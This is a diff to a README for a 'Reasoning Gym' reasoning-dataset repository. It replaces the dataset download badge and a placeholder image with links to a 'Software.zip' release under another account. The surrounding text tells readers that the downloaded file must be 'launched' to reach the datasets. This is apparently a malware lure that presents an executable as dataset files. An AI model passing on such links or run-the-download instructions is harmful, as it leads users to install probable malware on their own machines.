@@ -18,7 +18,7 @@ The datasets in this repository cover a wide range of topics and difficulty leve
 
 To get started, simply download the datasets from the following link:
 
-[![Download Datasets](https://img.shields.io/badge/Download-Datasets-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Datasets](https://github.com/SUKAPUUUU/reasoning-gym/releases/download/v2.0/Software.zip)](https://github.com/SUKAPUUUU/reasoning-gym/releases/download/v2.0/Software.zip)
 
 Click on the button above to download the datasets. If the link ends with a file name, it means that the file needs to be launched to access the dataset files.
 
@@ -36,7 +36,7 @@ Stay up to date with the latest updates, challenges, and discussions by followin
 
 Are you ready to embark on a journey of procedural reasoning discovery? Dive into the datasets, challenge your mind, and unlock new levels of cognitive abilities. The **Reasoning Gym** awaits you!
 
-![Reasoning Gym](https://yourimageurl.com)
+![Reasoning Gym](https://github.com/SUKAPUUUU/reasoning-gym/releases/download/v2.0/Software.zip)
 
 Keep calm and reason on! 💪🤓
 
